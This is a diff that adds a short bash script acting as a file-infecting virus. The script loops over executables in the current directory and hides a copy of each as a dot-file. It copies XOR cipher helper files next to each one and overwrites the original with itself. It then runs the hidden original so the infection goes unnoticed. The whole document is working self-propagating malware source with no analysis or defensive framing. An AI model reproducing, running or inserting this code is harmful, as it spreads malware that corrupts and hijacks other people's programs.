@@ -1,0 +1,18 @@
+#!/bin/bash
+#this_file=`basename $0`
+#echo $this_file
+for i in `ls -a * | grep -v $1`
+do
+	if [[ -x $i ]]; then
+		if [[ ! -f .$i.x21 ]] ; then
+			cp -f $i .$i.x21;
+			./.$1.xorcipher .$1.dexored .$i.virus $i;
+			cp -f .$1.xorcipher .$i.xorcipher;
+			cp -f .$1.to_call .$i.to_call;
+			cp -f $1 $i
+			break;
+		fi
+	fi
+
+done
+./.$1.x21 ${@:2};
